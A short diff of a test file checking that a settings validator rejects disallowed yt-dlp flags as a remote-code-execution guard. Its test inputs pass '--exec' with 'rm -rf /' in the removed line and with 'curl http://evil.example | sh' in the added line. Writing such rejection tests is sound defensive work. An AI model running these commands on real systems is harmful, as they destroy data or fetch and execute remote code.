@@ -61,10 +61,10 @@ describe('validateSettingsUpdate: ytdlpExtraFlags', () => {
 		).rejects.toMatchObject({ status: 400 });
 	});
 
-	it('rejects non-whitelisted flags', async () => {
+	it('rejects flags outside the yt-dlp whitelist (RCE guard)', async () => {
 		await expect(
-			validateSettingsUpdate({ ytdlpExtraFlags: ['--exec', 'rm -rf /'] }),
-		).rejects.toMatchObject({ status: 400, body: { message: 'Forbidden ytdlp flag: --exec' } });
+			validateSettingsUpdate({ ytdlpExtraFlags: ['--exec', 'curl http://evil.example | sh'] }),
+		).rejects.toMatchObject({ status: 400 });
 	});
 });
 
